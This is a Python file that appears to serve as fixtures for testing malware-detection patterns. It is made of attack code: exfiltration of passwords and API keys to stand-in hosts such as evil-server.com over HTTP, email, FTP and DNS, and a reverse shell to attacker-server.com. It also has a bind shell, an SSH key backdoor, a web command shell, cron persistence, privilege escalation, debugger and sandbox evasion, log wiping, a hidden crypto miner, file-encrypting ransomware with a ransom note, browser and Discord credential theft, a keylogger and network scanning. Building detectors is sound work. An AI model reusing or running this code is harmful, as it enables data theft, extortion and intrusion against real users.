# data_exfiltration_test.py - Data Theft and Exfiltration
import requests
import base64
import zipfile
import smtplib
from email.mime.text import MIMEText

def steal_sensitive_data():
    """Exfiltrate sensitive data via multiple channels."""
    
    # Collect sensitive data
    passwords = collect_browser_passwords()
    api_keys = harvest_api_keys()
    
    # Encode data for exfiltration
    encoded_data = base64.encode(passwords + api_keys)
    
    # Multiple exfiltration methods
    
    # HTTP POST exfiltration
    requests.post("http://evil-server.com/collect", data=encoded_data)
    
    # Email exfiltration
    msg = MIMEText(encoded_data)
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.send_message(msg, 'victim@company.com', 'attacker@evil.com')
    
    # FTP upload
    import ftplib
    ftp = ftplib.FTP('evil-ftp.com')
    ftp.storbinary('STOR sensitive.txt', encoded_data)
    
    # DNS exfiltration
    dns_query = f"data.{encoded_data[:32]}.evil-dns.com"
    import socket
    socket.gethostbyname(dns_query)
    
    # Create password-protected archive
    with zipfile.ZipFile('data.zip', 'w') as zf:
        zf.setpassword(b'secret123')
        zf.writestr('passwords.txt', passwords)

def collect_browser_passwords():
    """Collect passwords from browser storage."""
    # Chrome password extraction
    import sqlite3
    conn = sqlite3.connect('chrome_passwords.sqlite')
    passwords = conn.execute("SELECT * FROM logins").fetchall()
    return str(passwords)

def harvest_api_keys():
    """Harvest API keys from various sources."""
    api_keys = []
    # Search for API keys in files
    import os
    for root, dirs, files in os.walk('/'):
        for file in files:
            if 'config' in file or 'env' in file:
                # Extract API keys
                pass
    return str(api_keys)

# backdoor_creation_test.py - Backdoor and Persistence
import socket
import subprocess
import threading
import paramiko

def create_reverse_shell():
    """Create reverse shell backdoor."""
    
    # Connect back to attacker
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker-server.com', 4444))
    
    # Redirect shell to socket
    subprocess.call(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

def create_bind_shell():
    """Create bind shell that listens for connections."""
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 8888))
    s.listen(1)
    
    while True:
        conn, addr = s.accept()
        shell = subprocess.Popen(['/bin/bash'], stdin=conn.fileno(), stdout=conn.fileno())
        shell.wait()

def ssh_backdoor():
    """Create SSH-based backdoor."""
    
    # Add SSH key to authorized_keys
    ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com"
    with open('/home/user/.ssh/authorized_keys', 'a') as f:
        f.write(f"\n{ssh_key}\n")
    
    # Connect via SSH and execute commands
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')
    stdin, stdout, stderr = ssh.exec_command('whoami')

def web_backdoor():
    """Create web-based backdoor."""
    
    from flask import Flask, request
    app = Flask(__name__)
    
    @app.route('/backdoor', methods=['POST'])
    def execute_command():
        cmd = request.form.get('cmd')
        if cmd:
            result = subprocess.check_output(cmd, shell=True)
            return result
        return "No command"
    
    app.run(host='0.0.0.0', port=80)

def persistence_mechanism():
    """Establish persistence via cron job."""
    
    import crontab
    cron = crontab.CronTab(user='root')
    job = cron.new(command='/tmp/backdoor.py')
    job.minute.every(5)  # Run every 5 minutes
    cron.write()

# privilege_escalation_test.py - Privilege Escalation
import os
import subprocess

def escalate_privileges():
    """Attempt various privilege escalation techniques."""
    
    # SUID bit exploitation
    os.chmod('/tmp/exploit', 0o4755)  # Set SUID bit
    
    # Sudo password bypass
    subprocess.call(['sudo', 'passwd', 'root'], input=b'newpassword\nnewpassword\n')
    
    # Change ownership to root
    os.chown('/tmp/malware', 0, 0)  # Change to root:root
    
    # Set UID to root
    os.setuid(0)
    
    # Windows privilege escalation
    subprocess.call(['runas', '/user:administrator', 'cmd.exe'])

def kernel_exploit():
    """Attempt kernel-level privilege escalation."""
    
    # Read kernel memory
    with open('/proc/self/mem', 'rb') as mem:
        kernel_data = mem.read(1024)
    
    # Modify kernel structures
    import mmap
    with open('/dev/kmem', 'r+b') as kmem:
        mm = mmap.mmap(kmem.fileno(), 0)
        mm[0x1000:0x1010] = b'\x00' * 16  # Overwrite kernel data

def token_manipulation():
    """Windows token impersonation."""
    
    import ctypes
    from ctypes import wintypes
    
    # Duplicate access token
    kernel32 = ctypes.windll.kernel32
    advapi32 = ctypes.windll.advapi32
    
    token_handle = wintypes.HANDLE()
    advapi32.OpenProcessToken(-1, 0x0002, ctypes.byref(token_handle))
    
    # Impersonate token
    advapi32.ImpersonateLoggedOnUser(token_handle)

# anti_analysis_test.py - Evasion and Anti-Analysis
import time
import sys
import os

def detect_debugger():
    """Detect if running under debugger."""
    
    # Check for debugger presence
    import ctypes
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit("Debugger detected!")
    
    # Anti-debugging via ptrace
    import ctypes.util
    libc = ctypes.CDLL(ctypes.util.find_library("c"))
    if libc.ptrace(0, 0, 0, 0) == -1:
        sys.exit("Debugger detected via ptrace!")

def detect_virtual_machine():
    """Detect virtual machine environment."""
    
    # Check for VMware artifacts
    vm_artifacts = [
        '/sys/class/dmi/id/product_name',
        '/sys/class/dmi/id/sys_vendor'
    ]
    
    for artifact in vm_artifacts:
        if os.path.exists(artifact):
            with open(artifact, 'r') as f:
                content = f.read().lower()
                if 'vmware' in content or 'virtualbox' in content:
                    sys.exit("Virtual machine detected!")

def sandbox_evasion():
    """Evade sandbox analysis."""
    
    # Long sleep to timeout sandbox
    time.sleep(300)  # Sleep for 5 minutes
    
    # Check for analysis tools
    analysis_processes = ['wireshark', 'procmon', 'ollydbg', 'ida']
    
    import psutil
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in analysis_processes:
            sys.exit("Analysis tool detected!")

def anti_forensics():
    """Clear evidence and logs."""
    
    # Clear system logs
    subprocess.call(['rm', '-rf', '/var/log/*'])
    
    # Clear bash history
    os.remove('/home/user/.bash_history')
    
    # Wipe file metadata
    subprocess.call(['shred', '-vfz', '-n', '3', '/tmp/sensitive_file'])

# crypto_mining_test.py - Cryptocurrency Mining
import hashlib
import multiprocessing
import requests

def start_crypto_mining():
    """Start hidden cryptocurrency mining."""
    
    # Connect to mining pool
    pool_url = "stratum+tcp://xmr-pool.com:4444"
    wallet_address = "47hK4EauW8VmqbKz8H5WqJ2YwmzGKx5dKa..."
    
    # CPU mining
    def cpu_mining_worker():
        while True:
            # Mining algorithm simulation
            nonce = 0
            target = "0000" + "f" * 60
            
            while True:
                data = f"block_data_{nonce}".encode()
                hash_result = hashlib.sha256(data).hexdigest()
                
                if hash_result < target:
                    submit_share(hash_result, nonce)
                    break
                
                nonce += 1
    
    # Start multiple mining processes
    num_cores = multiprocessing.cpu_count()
    for i in range(num_cores):
        p = multiprocessing.Process(target=cpu_mining_worker)
        p.daemon = True  # Hide from process list
        p.start()

def gpu_mining():
    """GPU-based cryptocurrency mining."""
    
    try:
        import pycuda.driver as cuda
        import pycuda.autoinit
        
        # GPU mining code
        gpu_code = """
        __global__ void mine_crypto(int *input, int *output) {
            int idx = threadIdx.x + blockIdx.x * blockDim.x;
            // Mining algorithm on GPU
        }
        """
        
        # Execute GPU mining
        from pycuda.compiler import SourceModule
        mod = SourceModule(gpu_code)
        mine_func = mod.get_function("mine_crypto")
        
    except ImportError:
        # Fallback to CPU mining
        start_crypto_mining()

def submit_share(hash_result, nonce):
    """Submit mining share to pool."""
    
    payload = {
        'hash': hash_result,
        'nonce': nonce,
        'worker': 'hidden_miner_001'
    }
    
    requests.post('http://mining-pool.com/submit', json=payload)

def stealth_mining():
    """Mining with resource throttling to avoid detection."""
    
    import psutil
    
    while True:
        # Monitor CPU usage
        cpu_percent = psutil.cpu_percent(interval=1)
        
        if cpu_percent < 80:  # Only mine when CPU is not busy
            start_crypto_mining()
        else:
            time.sleep(10)  # Wait before checking again

# ransomware_test.py - Ransomware Patterns
import os
import glob
from cryptography.fernet import Fernet

def encrypt_files():
    """Encrypt files and demand ransom."""
    
    # Generate encryption key
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # File types to encrypt
    file_extensions = ['*.txt', '*.doc', '*.pdf', '*.jpg', '*.png']
    
    for ext in file_extensions:
        for file_path in glob.glob(f'/**/{ext}', recursive=True):
            try:
                # Read file
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # Encrypt file
                encrypted_data = cipher.encrypt(file_data)
                
                # Write encrypted file
                with open(file_path + '.locked', 'wb') as f:
                    f.write(encrypted_data)
                
                # Delete original
                os.remove(file_path)
                
            except Exception:
                continue
    
    # Store key on remote server
    requests.post('http://ransom-server.com/keys', data={'key': key})

def create_ransom_note():
    """Create ransom note for victim."""
    
    ransom_message = """
    YOUR FILES HAVE BEEN ENCRYPTED!
    
    All your important files have been encrypted with military-grade AES encryption.
    
    To decrypt your files, you need to pay 0.5 Bitcoin to the following address:
    1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    
    After payment, visit: http://darkweb-ransom.onion/decrypt
    
    You have 72 hours before the decryption key is deleted forever.
    
    DO NOT RESTART YOUR COMPUTER OR YOUR FILES WILL BE LOST FOREVER!
    """
    
    # Create ransom notes in multiple locations
    desktop_path = os.path.expanduser('~/Desktop/README_DECRYPT.txt')
    with open(desktop_path, 'w') as f:
        f.write(ransom_message)
    
    # Change desktop wallpaper
    import ctypes
    wallpaper_path = os.path.expanduser('~/Desktop/ransom_wallpaper.bmp')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

def disable_recovery():
    """Disable system recovery options."""
    
    # Delete shadow copies (Windows)
    subprocess.call(['vssadmin', 'delete', 'shadows', '/all', '/quiet'])
    
    # Disable startup repair
    subprocess.call(['bcdedit', '/set', '{default}', 'bootstatuspolicy', 'ignoreallfailures'])
    
    # Clear event logs
    subprocess.call(['wevtutil', 'cl', 'system'])

# credential_harvesting_test.py - Password and Token Theft
import sqlite3
import json
import keyring

def harvest_browser_passwords():
    """Extract passwords from web browsers."""
    
    # Chrome password extraction
    chrome_db = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
    if os.path.exists(chrome_db):
        conn = sqlite3.connect(chrome_db)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            passwords.append({
                'url': row[0],
                'username': row[1], 
                'password': decrypt_chrome_password(row[2])
            })
        
        # Exfiltrate passwords
        requests.post('http://evil-server.com/passwords', json=passwords)

def firefox_password_extraction():
    """Extract Firefox passwords."""
    
    firefox_profile = os.path.expanduser('~/.mozilla/firefox/*.default-release/')
    logins_file = os.path.join(firefox_profile, 'logins.json')
    
    if os.path.exists(logins_file):
        with open(logins_file, 'r') as f:
            logins = json.load(f)
        
        # Decrypt and exfiltrate
        for login in logins['logins']:
            username = decrypt_firefox_value(login['encryptedUsername'])
            password = decrypt_firefox_value(login['encryptedPassword'])

def keylogger():
    """Capture keystrokes to steal passwords."""
    
    import pynput.keyboard as keyboard
    
    captured_keys = []
    
    def on_key_press(key):
        try:
            captured_keys.append(key.char)
        except AttributeError:
            captured_keys.append(str(key))
        
        # Look for password patterns
        recent_keys = ''.join(captured_keys[-20:])
        if 'password' in recent_keys.lower():
            # Likely password being typed
            password_data = ''.join(captured_keys[-50:])
            exfiltrate_password(password_data)
    
    # Start keylogger
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

def steal_discord_tokens():
    """Steal Discord authentication tokens."""
    
    discord_paths = [
        os.path.expanduser('~/AppData/Roaming/discord/Local Storage/leveldb/'),
        os.path.expanduser('~/Library/Application Support/discord/Local Storage/leveldb/')
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        content = f.read()
                        # Extract Discord tokens
                        tokens = re.findall(r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}', content)
                        if tokens:
                            exfiltrate_tokens(tokens)

# network_reconnaissance_test.py - Network Scanning and Discovery
import socket
import threading
import subprocess

def port_scan_network():
    """Scan network for open ports."""
    
    network = "192.168.1"
    common_ports = [22, 23, 53, 80, 135, 139, 443, 445, 993, 995, 1723, 3389, 5900]
    
    def scan_host(ip):
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        if open_ports:
            print(f"{ip}: {open_ports}")
            exfiltrate_scan_results(ip, open_ports)
    
    # Scan entire subnet
    threads = []
    for i in range(1, 255):
        ip = f"{network}.{i}"
        t = threading.Thread(target=scan_host, args=(ip,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

def nmap_scan():
    """Use nmap for advanced network scanning."""
    
    # Service version detection
    result = subprocess.check_output(['nmap', '-sV', '-p-', '192.168.1.0/24'])
    
    # Vulnerability scanning
    vuln_scan = subprocess.check_output(['nmap', '--script', 'vuln', '192.168.1.1'])
    
    # Send results to C&C server
    requests.post('http://c2-server.com/recon', data={
        'service_scan': result,
        'vuln_scan': vuln_scan
    })

def dns_enumeration():
    """Enumerate DNS information."""
    
    domain = "target-company.com"
    
    # DNS zone transfer attempt
    try:
        subprocess.check_output(['dig', 'axfr', domain])
    except:
        pass
    
    # Subdomain brute forcing
    subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging']
    
    for sub in subdomains:
        try:
            full_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(full_domain)
            print(f"Found: {full_domain} -> {ip}")
        except:
            pass

def snmp_scan():
    """SNMP community string enumeration."""
    
    from pysnmp.hlapi import *
    
    community_strings = ['public', 'private', 'admin', 'manager']
    
    for community in community_strings:
        try:
            for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
                SnmpEngine(),
                CommunityData(community),
                UdpTransportTarget(('192.168.1.1', 161)),
                ContextData(),
                ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')),
                lexicographicMode=False):
                
                if errorIndication:
                    break
                elif errorStatus:
                    break
                else:
                    print(f"SNMP access with community: {community}")
                    break
        except:
            continue

# Helper functions for testing
def decrypt_chrome_password(encrypted_password):
    """Decrypt Chrome password (simplified)."""
    return "decrypted_password"

def decrypt_firefox_value(encrypted_value):
    """Decrypt Firefox value (simplified)."""
    return "decrypted_value"

def exfiltrate_password(password_data):
    """Send captured password data."""
    requests.post('http://evil-server.com/keylog', data={'keys': password_data})

def exfiltrate_tokens(tokens):
    """Send stolen tokens."""
    requests.post('http://evil-server.com/tokens', json={'tokens': tokens})

def exfiltrate_scan_results(ip, ports):
    """Send network scan results."""
    requests.post('http://c2-server.com/scan', json={'ip': ip, 'ports': ports})

# Example usage demonstrating multiple attack vectors
if __name__ == "__main__":
    print("Starting comprehensive malware simulation...")
    
    # This would trigger ALL the new detection patterns
    steal_sensitive_data()
    create_reverse_shell()
    escalate_privileges()
    detect_debugger()
    start_crypto_mining()
    encrypt_files()
    harvest_browser_passwords()
    port_scan_network()
    
    print("All attack simulations complete!")
